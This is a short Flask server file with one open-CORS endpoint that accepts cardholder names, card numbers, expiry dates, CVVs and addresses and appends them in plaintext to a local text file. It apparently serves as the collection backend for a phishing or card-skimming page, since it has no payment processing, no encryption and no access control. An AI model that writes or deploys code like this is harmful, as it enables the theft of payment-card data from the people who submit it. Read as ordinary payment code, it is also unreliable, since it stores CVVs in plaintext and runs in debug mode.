from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)
data_file = "card_data.txt"

@app.route('/submit', methods=['POST'])
def submit_data():
    data = request.get_json()
    cardholder = data.get('cardholder', '')
    cardnumber = data.get('cardnumber', '')
    expiry = data.get('expiry', '')
    cvv = data.get('cvv', '')
    address = data.get('address', '')
    if cardholder and cardnumber and expiry and cvv:
        with open(data_file, 'a') as f:
            f.write(f"Cardholder: {cardholder}, Card: {cardnumber}, Expiry: {expiry}, CVV: {cvv}, Address: {address}\n")
        return jsonify({"message": "Data saved successfully"}), 200
    return jsonify({"message": "Invalid data"}), 400

if __name__ == '__main__':
    if not os.path.exists(data_file):
        open(data_file, 'w').close()
    app.run(debug=True, port=8000)
